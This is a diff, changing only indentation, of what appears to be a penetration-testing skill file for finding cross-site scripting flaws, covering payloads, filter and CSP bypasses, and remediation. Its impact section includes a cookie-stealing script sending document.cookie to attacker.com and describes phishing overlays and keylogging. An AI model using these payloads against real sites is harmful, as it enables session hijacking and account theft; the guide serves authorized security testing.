@@ -1,10 +1,10 @@
 ---
 name: testing-for-xss-vulnerabilities
 description: Tests web applications for reflected, stored, and DOM-based Cross-Site
-  Scripting by injecting JavaScript payloads with Burp Suite (XSS extensions, Active
-  Scan++) and browser tools, then bypassing sanitization and CSP to demonstrate session
-  hijacking and user impersonation. Use for OWASP WSTG client-side injection testing or
-  when evaluating input sanitization and output encoding coverage.
+ Scripting by injecting JavaScript payloads with Burp Suite (XSS extensions, Active
+ Scan++) and browser tools, then bypassing sanitization and CSP to demonstrate session
+ hijacking and user impersonation. Use for OWASP WSTG client-side injection testing or
+ when evaluating input sanitization and output encoding coverage.
 domain: cybersecurity
 subdomain: penetration-testing
 tags:
@@ -61,11 +61,11 @@ Map every location where user input enters and is rendered by the application:
 - **Stored inputs**: Identify features where input is saved and displayed later: user profiles, comments, forum posts, file names, support tickets, and chat messages
 - **DOM inputs**: Identify client-side JavaScript that reads from `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, or `localStorage` and writes to the DOM
 - **Output context identification**: For each reflected input, determine the rendering context:
-  - HTML body: `<div>USER_INPUT</div>`
-  - HTML attribute: `<input value="USER_INPUT">`
-  - JavaScript string: `var x = 'USER_INPUT';`
-  - URL context: `<a href="USER_INPUT">`
-  - CSS context: `<div style="color: USER_INPUT">`
+ - HTML body: `<div>USER_INPUT</div>`
+ - HTML attribute: `<input value="USER_INPUT">`
+ - JavaScript string: `var x = 'USER_INPUT';`
+ - URL context: `<a href="USER_INPUT">`
+ - CSS context: `<div style="color: USER_INPUT">`
 
 ### Step 2: Reflected XSS Testing
 
@@ -77,10 +77,10 @@ Test reflected injection points with context-appropriate payloads:
 - **URL/href context**: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
 - **Inside HTML comments**: `--><script>alert(1)</script><!--`
 - **Filter bypass payloads** (when basic payloads are blocked):
-  - Case variation: `<ScRiPt>alert(1)</sCrIpT>`
-  - Event handlers: `<details open ontoggle=alert(1)>`
-  - SVG: `<svg><animate onbegin=alert(1) attributeName=x>`
-  - Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`
+ - Case variation: `<ScRiPt>alert(1)</sCrIpT>`
+ - Event handlers: `<details open ontoggle=alert(1)>`
+ - SVG: `<svg><animate onbegin=alert(1) attributeName=x>`
+ - Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`
 
 ### Step 3: Stored XSS Testing
 
@@ -98,13 +98,13 @@ Test persistent storage points that render input to other users:
 Analyze client-side JavaScript for unsafe DOM manipulation:
 
 - **Source identification**: Search JavaScript for dangerous sources that read attacker-controlled input:
-  - `document.location`, `document.URL`, `document.referrer`
-  - `location.hash`, `location.search`, `location.href`
-  - `window.name`, `postMessage` event data
+ - `document.location`, `document.URL`, `document.referrer`
+ - `location.hash`, `location.search`, `location.href`
+ - `window.name`, `postMessage` event data
 - **Sink identification**: Search for dangerous sinks that write to the DOM:
-  - `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`
-  - `eval()`, `setTimeout()`, `setInterval()`, `Function()`
-  - `element.setAttribute()` with event handlers, `jQuery.html()`, `.append()`, `v-html` (Vue), `dangerouslySetInnerHTML` (React)
+ - `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`
+ - `eval()`, `setTimeout()`, `setInterval()`, `Function()`
+ - `element.setAttribute()` with event handlers, `jQuery.html()`, `.append()`, `v-html` (Vue), `dangerouslySetInnerHTML` (React)
 - **Trace data flow**: Follow the path from source to sink. If user-controlled input reaches a dangerous sink without proper sanitization, DOM XSS exists.
 - **Framework-specific testing**: Test React `dangerouslySetInnerHTML`, Angular template injection (`{{constructor.constructor('alert(1)')()}}`), Vue `v-html` directive
 
@@ -113,16 +113,16 @@ Analyze client-side JavaScript for unsafe DOM manipulation:
 Test Content Security Policy effectiveness and demonstrate real-world impact:
 
 - **CSP analysis**: Review the CSP header for weaknesses:
-  - `unsafe-inline` in script-src allows inline scripts
-  - `unsafe-eval` allows eval() and similar functions
-  - Wildcard domains (`*.googleapis.com`) may host JSONP endpoints usable for CSP bypass
-  - `base-uri` not set allows `<base>` tag injection to redirect relative script loads
+ - `unsafe-inline` in script-src allows inline scripts
+ - `unsafe-eval` allows eval() and similar functions
+ - Wildcard domains (`*.googleapis.com`) may host JSONP endpoints usable for CSP bypass
+ - `base-uri` not set allows `<base>` tag injection to redirect relative script loads
 - **JSONP bypass**: If CSP allows a domain with JSONP endpoints, use `<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>`
 - **Impact demonstration**:
-  - Session hijacking: `<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>`
-  - Credential phishing: Inject a fake login form overlay that submits to the attacker's server
-  - Keylogging: Inject JavaScript that captures keystrokes on the page
-  - Account takeover: Use XSS to change the victim's email address and trigger a password reset
+ - Session hijacking: `<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>`
+ - Credential phishing: Inject a fake login form overlay that submits to the attacker's server
+ - Keylogging: Inject JavaScript that captures keystrokes on the page
+ - Account takeover: Use XSS to change the victim's email address and trigger a password reset
 
 ## Key Concepts
 
@@ -193,9 +193,9 @@ refunds, and modify orders. Affects all 23 support agents who view customer tick
 
 **Remediation**:
 1. Implement output encoding using a context-aware library (OWASP Java Encoder,
-   DOMPurify for client-side rendering)
+ DOMPurify for client-side rendering)
 2. Deploy Content Security Policy header:
-   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
+ Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
 3. Set HttpOnly flag on session cookies to prevent JavaScript access
 4. Sanitize HTML input server-side using a whitelist approach (allow only safe tags)
 ```
